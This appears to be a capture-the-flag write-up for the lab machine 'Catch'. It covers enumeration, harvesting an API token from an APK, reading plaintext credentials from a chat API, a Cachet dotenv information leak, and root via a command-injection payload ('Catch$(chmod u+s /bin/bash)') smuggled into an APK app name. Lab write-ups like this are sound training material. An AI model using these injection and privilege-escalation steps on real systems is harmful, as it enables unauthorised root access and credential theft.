# Catch

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.84.253
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 03:36 EDT
Nmap scan report for 10.129.84.253
Host is up (0.0098s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
5000/tcp open  upnp
8000/tcp open  http-alt
```

Lots of HTTP ports it seems.

### Catch Global Systems

Typical corporate page:

<figure><img src="../../../.gitbook/assets/image (861).png" alt=""><figcaption></figcaption></figure>

I tried enumerating, but I could not find much here. The only thing was the Download Now button, which downloaded an APK file to my machine. Interesting, but we can move on.&#x20;

### Gitea

Port 3000 was a Gitea instance:

<figure><img src="../../../.gitbook/assets/image (2814).png" alt=""><figcaption></figcaption></figure>

No repositories present, but tehre was one user:

<figure><img src="../../../.gitbook/assets/image (3714).png" alt=""><figcaption></figcaption></figure>

Nothing much there. However, Gitea does have an API present at the bottom, and clicking it loads an empty page:

<figure><img src="../../../.gitbook/assets/image (3043).png" alt=""><figcaption></figcaption></figure>

Check the page source, it seems that there's a subdomain that needs to be added:

<figure><img src="../../../.gitbook/assets/image (1911).png" alt=""><figcaption></figcaption></figure>

Once added to the `/etc/hosts` file, we can see that the page loads some documentation:

<figure><img src="../../../.gitbook/assets/image (1210).png" alt=""><figcaption></figcaption></figure>

Still, nothing much.

### Let's Chat

On port 5000, there was another application, and this time with a login page:

<figure><img src="../../../.gitbook/assets/image (1105).png" alt=""><figcaption></figcaption></figure>

Default credentials don't work...so there's again nothing here.

### Incident Reporter

On port 8000, there was an incident reporter, kind of like a SIEM or something:

<figure><img src="../../../.gitbook/assets/image (2536).png" alt=""><figcaption></figcaption></figure>

Attempting to visit the dashboard revealed that this is running Cachet:

<figure><img src="../../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

Cachet DID have some vulnerabilities present (finally!). Most notably, there is an information leak and a RCE exploit possible:

{% embed url="https://www.sonarsource.com/blog/cachet-code-execution-via-laravel-configuration-injection/" %}

We'll keep this in mind.&#x20;

### APK Reversing

With the APK, we can try to reverse engineer it and perhaps find an exploit or credentials. We can use the Mobile Security Framework to do this:

{% embed url="https://github.com/MobSF/Mobile-Security-Framework-MobSF" %}

We can use the online version for ourselves:

{% embed url="https://mobsf.live/" %}

We can upload the APK file we downloaded and let it analyse it for us. What's great about this is that it also checks for secrets and passwords alike. At the bottom of the page, we would see these tokens:

<figure><img src="../../../.gitbook/assets/image (976).png" alt=""><figcaption></figcaption></figure>

I didn't really know what to do even if I had Gitea access, so let's exploit the Let's Chat Token

### Let's Chat Token

This was a Base64 token, so let's try to use an `Authorization` HTTP header as the token. Also, at the very bottom of the page, there was a Github Repository present (which I missed the first time).&#x20;

{% embed url="https://github.com/sdelements/lets-chat" %}

This application has an API with documentation here:

{% embed url="https://github.com/sdelements/lets-chat/wiki/API%3A-Authentication" %}

We can access it via `/rooms`:

```
$ curl -s http://10.129.84.253:5000/rooms -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' 
[{"id":"61b86b28d984e2451036eb17","slug":"status","name":"Status","description":"Cachet Updates and Maintenance","lastActive":"2021-12-14T10:34:20.749Z","created":"2021-12-14T10:00:08.384Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b8708efe190b466d476bfb","slug":"android_dev","name":"Android Development","description":"Android App Updates, Issues & More","lastActive":"2021-12-14T10:24:21.145Z","created":"2021-12-14T10:23:10.474Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]},{"id":"61b86b3fd984e2451036eb18","slug":"employees","name":"Employees","description":"New Joinees, Org updates","lastActive":"2021-12-14T10:18:04.710Z","created":"2021-12-14T10:00:31.043Z","owner":"61b86aead984e2451036eb16","private":false,"hasPassword":false,"participants":[]}] 
```

The output can be beautified using `jq`.&#x20;

```
$ curl -s http://10.129.84.253:5000/rooms -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq
[
  {
    "id": "61b86b28d984e2451036eb17",
    "slug": "status",
    "name": "Status",
    "description": "Cachet Updates and Maintenance",
    "lastActive": "2021-12-14T10:34:20.749Z",
    "created": "2021-12-14T10:00:08.384Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b8708efe190b466d476bfb",
    "slug": "android_dev",
    "name": "Android Development",
    "description": "Android App Updates, Issues & More",
    "lastActive": "2021-12-14T10:24:21.145Z",
    "created": "2021-12-14T10:23:10.474Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  },
  {
    "id": "61b86b3fd984e2451036eb18",
    "slug": "employees",
    "name": "Employees",
    "description": "New Joinees, Org updates",
    "lastActive": "2021-12-14T10:18:04.710Z",
    "created": "2021-12-14T10:00:31.043Z",
    "owner": "61b86aead984e2451036eb16",
    "private": false,
    "hasPassword": false,
    "participants": []
  }
]
```

Each entity here is a 'room'. So we can enumerate the messages sent in each room at `/room/<ID>/messages`. When viewing the messages in the Cachet room, we would find a password:

```
$ curl -s http://10.129.84.253:5000/rooms/61b86b28d984e2451036eb17/messages -H 'Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' | jq
<TRUNCATED>
{
    "id": "61b8702dfe190b466d476bfa",
    "text": "Here are the credentials `john :  E}V!mywu_69T4C}W`",
    "posted": "2021-12-14T10:21:33.859Z",
    "owner": "61b86f15fe190b466d476bf5",
    "room": "61b86b28d984e2451036eb17"
}
<TRUNCATED>
```

Great! Now we can login on Cachet.&#x20;

### Cachet Information Leak

In the SonarLink blog, it is stated that we could potentially leak the configuration of the `dotenv` file, which is the basis of the RCE. In this case, it supports **nested variable assignment**. This would mean that `${NAME}` is accepted and will run.&#x20;

Following the PoC, we can use `${DB_USERNAME}` and `${DB_PASSWORD}` within Settings > Mail in the Mail Host and Mail From Address fields.

<figure><img src="../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

When we reload the page, this would appear:

<figure><img src="../../../.gitbook/assets/image (3751).png" alt=""><figcaption></figcaption></figure>

Great! Testing this with `ssh` reveals that this is indeed the password of the user `will`. Skipped the RCE!

## Privilege Escalation

There are 2 users within the machine:

```
will@catch:/home/git$ ls -la
total 16
drwxr-xr-x 3 git  git  4096 Dec 14  2021 .
drwxr-xr-x 4 root root 4096 Dec 14  2021 ..
-rw-r--r-- 1 git  git   162 Dec 14  2021 .gitconfig
drwx------ 2 git  git  4096 Dec 14  2021 .ssh
```

No `sudo` privileges or others to exploit. So, I ran a `pspy64` to enumerate what was going on within the machine.

### Verify.sh Injection

Here's the interesting output:

```
2023/04/30 08:14:01 CMD: UID=0    PID=26238  | /bin/sh -c rm -rf /root/mdm/certified_apps/* 
2023/04/30 08:14:01 CMD: UID=0    PID=26241  | /bin/bash /opt/mdm/verify.sh 
2023/04/30 08:14:01 CMD: UID=0    PID=26240  | /bin/sh -c /opt/mdm/verify.sh 
2023/04/30 08:14:01 CMD: UID=0    PID=26245  | openssl rand -hex 12 
2023/04/30 08:14:01 CMD: UID=???  PID=26246  | 
2023/04/30 08:14:01 CMD: UID=0    PID=26247  | jarsigner -verify /root/mdm/apk_bin/1ac670ac7db72df80f0e88bb.apk                                                                         
2023/04/30 08:14:01 CMD: UID=0    PID=26254  | /lib/systemd/systemd-udevd 
2023/04/30 08:14:02 CMD: UID=0    PID=26267  | 
2023/04/30 08:14:02 CMD: UID=0    PID=26271  | grep -v verify.sh 
2023/04/30 08:14:02 CMD: UID=0    PID=26270  | grep -v apk_bin 
2023/04/30 08:14:02 CMD: UID=???  PID=26269  | ???
2023/04/30 08:14:02 CMD: UID=0    PID=26268  | /bin/bash /opt/mdm/verify.sh 
```

It seems that there's a `verify.sh` being run every minute or so. Here's the script:

```bash
#!/bin/bash

###################
# Signature Check #
###################

sig_check() {
        jarsigner -verify "$1/$2" 2>/dev/null >/dev/null
        if [[ $? -eq 0 ]]; then
                echo '[+] Signature Check Passed'
        else
                echo '[!] Signature Check Failed. Invalid Certificate.'
                cleanup
                exit
        fi
}

#######################
# Compatibility Check #
#######################

comp_check() {
        apktool d -s "$1/$2" -o $3 2>/dev/null >/dev/null
        COMPILE_SDK_VER=$(grep -oPm1 "(?<=compileSdkVersion=\")[^\"]+" "$PROCESS_BIN/AndroidManifest.xml")
        if [ -z "$COMPILE_SDK_VER" ]; then
                echo '[!] Failed to find target SDK version.'
                cleanup
                exit
        else
                if [ $COMPILE_SDK_VER -lt 18 ]; then
                        echo "[!] APK Doesn't meet the requirements"
                        cleanup
                        exit
                fi
        fi
}

####################
# Basic App Checks #
####################

app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}


###########
# Cleanup #
###########

cleanup() {
        rm -rf $PROCESS_BIN;rm -rf "$DROPBOX/*" "$IN_FOLDER/*";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)
}


###################
# MDM CheckerV1.0 #
###################

DROPBOX=/opt/mdm/apk_bin
IN_FOLDER=/root/mdm/apk_bin
OUT_FOLDER=/root/mdm/certified_apps
PROCESS_BIN=/root/mdm/process_bin

for IN_APK_NAME in $DROPBOX/*.apk;do
        OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
        APK_NAME="$(openssl rand -hex 12).apk"
        if [[ -L "$IN_APK_NAME" ]]; then
                exit
        else
                mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
        fi
        sig_check $IN_FOLDER $APK_NAME
        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
done
cleanup
```

The script seems to do some checking on whether the file is legit or not. However, within the `app_check()` function, there's an Command Injection Vulnerability.&#x20;

```bash
app_check() {
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup
                exit
        fi
}
```

The `APP_NAME` variable has to have the word 'Catch' within it, and then this parameter is passed directly to a command without sanitisation. We can use a `$()` expression to inject here since subshells would be processed before the rest of it.&#x20;

Now, we need to create a valid file to be used. Using the APK we had earlier, we can decompile is using `apktool`:

```
$ java -jar apktool_2.6.1.jar d catchv1.0.apk -o decompiled
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.1 on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

Then, we edit the `app_name` variable located within `res/values/strings.xml`:

```markup
<string name="app_name">Catch$(chmod u+s /bin/bash)</string>
```

Then, we need to recompile this entire thing again.

```
$ java -jar apktool_2.6.1.jar b -f decompiled -o pwn.apk   
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.1
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
```

Then, download this file into the `/opt/mdm/apk_bin` file and wait a bit. The `/bin/bash` file would be an SUID binary, and we can spawn a root shell:

```
will@catch:/opt/mdm/apk_bin$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
will@catch:/opt/mdm/apk_bin$ /bin/bash -p
bash-5.0# id
uid=1000(will) gid=1000(will) euid=0(root) groups=1000(will)
```

Rooted!
